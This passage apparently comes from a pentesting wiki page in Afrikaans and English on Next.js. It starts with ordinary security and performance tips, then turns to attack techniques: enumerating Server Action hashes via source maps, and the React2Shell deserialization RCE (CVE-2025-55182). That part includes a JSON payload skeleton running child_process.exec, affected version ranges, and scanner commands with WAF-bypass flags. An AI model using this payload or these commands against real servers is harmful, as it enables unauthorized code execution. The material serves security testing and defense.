- **Gebruik `.env` lêers:** Stoor veranderlikes soos API-sleutels in `.env.local` (uitgesluit van weergawebeheer).
- **Gryp veranderlikes veilig aan:** Gebruik `process.env.VARIABLE_NAME` om omgewingsveranderlikes te kry.
- **Maak nooit geheime op die kliënt sigbaar nie:** Verseker dat sensitiewe veranderlikes slegs aan die server-kant gebruik word.

**Voorbeeld:**
```javascript
// next.config.js
module.exports = {
env: {
API_KEY: process.env.API_KEY, // Accessible on both client and server
SECRET_KEY: process.env.SECRET_KEY, // Be cautious if accessible on the client
},
}
```
**Opmerking:** Om veranderlikes slegs aan die bedienerkant te beperk, laat hulle uit die `env`-object weg of voeg die voorvoegsel `NEXT_PUBLIC_` by vir blootstelling aan die client.

### Verifikasie en Magtiging

**Benadering:**

- **Session-Based Authentication:** Gebruik cookies om gebruikersessies te bestuur.
- **Token-Based Authentication:** Implementeer JWTs vir statelose verifikasie.
- **Third-Party Providers:** Integreer met OAuth-providers (bv. Google, GitHub) deur biblioteke soos `next-auth` te gebruik.

**Sekuriteitspraktyke:**

- **Secure Cookies:** Stel die `HttpOnly`, `Secure` en `SameSite` instellings.
- **Password Hashing:** Hash altyd wagwoorde voordat jy dit stoor.
- **Input Validation:** Voorkom injection attacks deur invoer te valideer en te sanitiseer.

**Voorbeeld:**
```javascript
// pages/api/login.js
import { sign } from "jsonwebtoken"
import { serialize } from "cookie"

export default async function handler(req, res) {
const { username, password } = req.body

// Validate user credentials
if (username === "admin" && password === "password") {
const token = sign({ username }, process.env.JWT_SECRET, {
expiresIn: "1h",
})
res.setHeader(
"Set-Cookie",
serialize("auth", token, {
path: "/",
httpOnly: true,
secure: true,
sameSite: "strict",
})
)
res.status(200).json({ message: "Logged in" })
} else {
res.status(401).json({ error: "Invalid credentials" })
}
}
```
### Prestasie-optimalisering

**Strategieë:**

- **Beeldoptimalisering:** Gebruik Next.js se `next/image` komponent vir outomatiese beeldoptimalisering.
- **Kode-splitsing:** Gebruik dinamiese imports om kode op te deel en aanvanklike laaitye te verminder.
- **Kaching:** Implementeer kachingstrategieë vir API-antwoorde en statiese assets.
- **Lui laai:** Laai komponente of assets slegs wanneer hulle nodig is.

**Voorbeeld:**
```jsx
// Dynamic Import with Code Splitting
import dynamic from "next/dynamic"

const HeavyComponent = dynamic(() => import("../components/HeavyComponent"), {
loading: () => <p>Loading...</p>,
})
```
## Next.js Server Actions Enumeration (hash to function name via source maps)

Moderne Next.js gebruik “Server Actions” wat op die bediener uitgevoer word, maar vanaf die kliënt aangeroep word. In produksie is hierdie oproepe opaak: alle POSTs beland op 'n gemeenskaplike endpoint en word onderskei deur 'n build-spesifieke hash wat in die `Next-Action` header gestuur word. Voorbeeld:
```http
POST /
Next-Action: a9f8e2b4c7d1...
```
As `productionBrowserSourceMaps` aangeskakel is, bevat geminifiseerde JS-chunks oproepe na `createServerReference(...)` wat genoeg struktuur lek (plus geassosieerde source maps) om 'n koppeling te herstel tussen die action-hash en die oorspronklike funksienaam. Dit laat jou toe om hashes wat in `Next-Action` waargeneem word na konkrete teikens soos `deleteUserAccount()` of `exportFinancialData()` te vertaal.

### Ekstraksiebenadering (regex op geminifiseerde JS + opsionele source maps)

Soek in afgelaaide JS-chunks na `createServerReference` en onttrek die hash en die funksie-/bron-simbool. Twee nuttige patrone:
```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```
- Groep 1: server action hash (40+ hex chars)
- Groep 2: symbol or path that can be resolved to the original function via the source map wanneer teenwoordig

### Praktiese werkvloei

- Passiewe ontdekking terwyl jy blaai: vang versoeke met `Next-Action` headers en JS chunk URLs.
- Haal die genoemde JS bundles en die gepaardgaande `*.map` lêers af (wanneer teenwoordig).
- Voer die regex hierbo uit om 'n hash↔name woordeboek te bou.
- Gebruik die woordeboek om toetsing te teiken:
  - Naamgedrewe triage (bv., `transferFunds`, `exportFinancialData`).
  - Volg dekking oor builds deur funksienaam (hashes roteer oor builds).

### Uitoefening van verborge aksies (sjabloon-gebaseerde versoek)

Neem 'n geldige POST wat in die proxy waargeneem is as sjabloon en ruil die `Next-Action` waarde om 'n ander ontdekte aksie te teiken:
```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```
Replay in Repeater and toets magtiging, invoervalidatie en besigheidslogika van andersins onbereikbare actions.

### Burp automation

- NextjsServerActionAnalyzer (Burp extension) outomatiseer die bogenoemde in Burp:
- Doorsoek proxy-geskiedenis na JS-chunks, onttrek `createServerReference(...)` inskrywings, en ontleed source maps wanneer beskikbaar.
- Handhaaf 'n deursoekbare hash↔function-name woordeboek en verwyder duplikate oor builds volgens function-name.
- Kan 'n geldige template POST vind en 'n gereed-om-te-stuur Repeater-oortjie oopmaak met die teiken action se hash ingewissel.
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### Notes and limitations

- Vereis dat `productionBrowserSourceMaps` in production aangeskakel is om name uit bundles/source maps te herstel.
- Function-name disclosure is nie 'n kwetsbaarheid op sigself nie; gebruik dit om ontdekking te lei en elke action se magtiging te toets.

### React Server Components Flight protocol deserialization RCE (CVE-2025-55182)

Next.js App Router deployments wat Server Actions blootstel op `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** bevat 'n kritieke server-side prototype pollution tydens **Flight** chunk deserialization. Deur `$` verwysings binne 'n Flight payload te plaas kan 'n aanvaller van besoedelde prototypes na arbitrêre JavaScript-execution en dan na OS-kommando-uitvoering binne die Node.js-proses skuif.

{{#ref}}
../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
{{#endref}}

#### Attack chain in Flight chunks

1. **Prototype pollution primitive:** Stel `"then": "$1:__proto__:then"` sodat die resolver 'n `then` funksie op `Object.prototype` skryf. Enige gewone objek wat daarna verwerk word word 'n thenable, wat die aanvaller toelaat om asynchrone beheervloei binne RSC internals te beïnvloed.
2. **Rebinding to the global `Function` constructor:** Wys `_response._formData.get` na `"$1:constructor:constructor"`. Tydens resolusie, `object.constructor` → `Object`, en `Object.constructor` → `Function`, sodat toekomstige oproepe na `_formData.get()` eintlik `Function(...)` uitvoer.
3. **Code execution via `_prefix`:** Plaas JavaScript-bron in `_response._prefix`. Wanneer die besoedelde `_formData.get` aangeroep word, evalueer die raamwerk `Function(_prefix)(...)`, sodat die geïnjekteerde JS `require('child_process').exec()` of enige ander Node-primitive kan uitvoer.

#### Payload skeleton
```json
{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "require('child_process').exec('id')",
"_chunks": "$Q2",
"_formData": { "get": "$1:constructor:constructor" }
}
}
```
#### In kaart bring van React Server Function blootstelling

React Server Functions (RSF) is enige funksies wat die 'use server'; direktief insluit. Elke form action, mutation, of fetch helper wat aan een van daardie funksies gebind is, word 'n RSC Flight endpoint wat sonder probleem deur aanvallers verskafde payloads deserialiseer. Nuttige recon-stappe afkomstig van React2Shell assessments:

- **Statiese inventaris:** kyk vir die direktief om te verstaan hoeveel RSFs deur die framework outomaties blootgestel word.
```bash
rg -n "'use server';" -g"*.{js,ts,jsx,tsx}" app/
```
- **App Router standaardinstellings:** `create-next-app` skakel die App Router + `app/` directory standaard aan, wat stilweg elke route in 'n RSC-geskikte endpoint omskakel. App Router assets soos `/_next/static/chunks/app/` of responses wat Flight chunks oor `text/x-component` stroom, is duidelike internetvingerafdrukke.
- **Impliciet kwesbare RSC-deployments:** React se eie adviesnota maak op dat apps wat die RSC-runtime versend, uitbuitbaar kan wees **selfs sonder eksplisiete RSFs**, dus beskou enige build wat `react-server-dom-*` 19.0.0–19.2.0 gebruik as verdag.
- **Ander raamwerke wat RSC saamvoeg:** Vite RSC, Parcel RSC, React Router RSC preview, RedwoodSDK, Waku, ens. hergebruik dieselfde serializer en erf dieselfde eksterne aanvalsoppervlak totdat hulle gepatchte React-builds inbed.

#### Weergawe-dekking (React2Shell)

- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`: **vulnerable** in 19.0.0, 19.1.0–19.1.1 and 19.2.0; **patched** in 19.0.1, 19.1.2 and 19.2.1 respectively.
- **Next.js stable:** App Router releases 15.0.0–16.0.6 inkorporeer die vulnerable RSC-stapel. Patch trains 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 sluit fixed deps in, so enige build onder daardie weergawes is high-value.
- **Next.js canary:** `14.3.0-canary.77+` stuur ook die buggy runtime en het tans geen gepatchte canary-drops nie, wat daardie vingerafdrukke sterk kandidate vir uitbuiting maak.

#### Afstandsdeteksie-orakel

Assetnote’s [`react2shell-scanner`](https://github.com/assetnote/react2shell-scanner) stuur 'n vervaardigde multipart Flight-versoek na kandidaatpade en monitor server-side gedrag:

- **Verstekmodus** voer 'n deterministiese RCE payload uit (wiskundige operasie weerspieël via `X-Action-Redirect`) wat kode-uitvoering bewys.
- **`--safe-check` mode** doelbewus vervorm die Flight-boodskap sodat gepatchte servers `200/400` teruggee, terwyl kwesbare teikens `HTTP/500` responses uitsend wat die substring `E{"digest"` in die body bevat. Daardie `(500 + digest)` paar is tans die mees betroubare afstandsorakel wat deur verdedigers gepubliseer is.
- Ingeboude `--waf-bypass`, `--vercel-waf-bypass`, en `--windows` switches pas die payload layout aan, prepend junk, of ruil OS-kommando's sodat jy werklike Internet-bates kan probeer.
```bash
python3 scanner.py -u https://target.tld --path /app/api/submit --safe-check
python3 scanner.py -l hosts.txt -t 20 --waf-bypass -o vulnerable.json
```
## Verwysings

- [Pentesting Next.js Server Actions — A Burp Extension for Hash-to-Function Mapping](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
- [NextjsServerActionAnalyzer (Burp extension)](https://github.com/Adversis/NextjsServerActionAnalyzer)
- [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)
- [CVE-2025-55182 & CVE-2025-66478 React2Shell – All You Need to Know](https://jfrog.com/blog/2025-55182-and-2025-66478-react2shell-all-you-need-to-know/)
- [assetnote/react2shell-scanner](https://github.com/assetnote/react2shell-scanner)

{{#include ../../banners/hacktricks-training.md}}
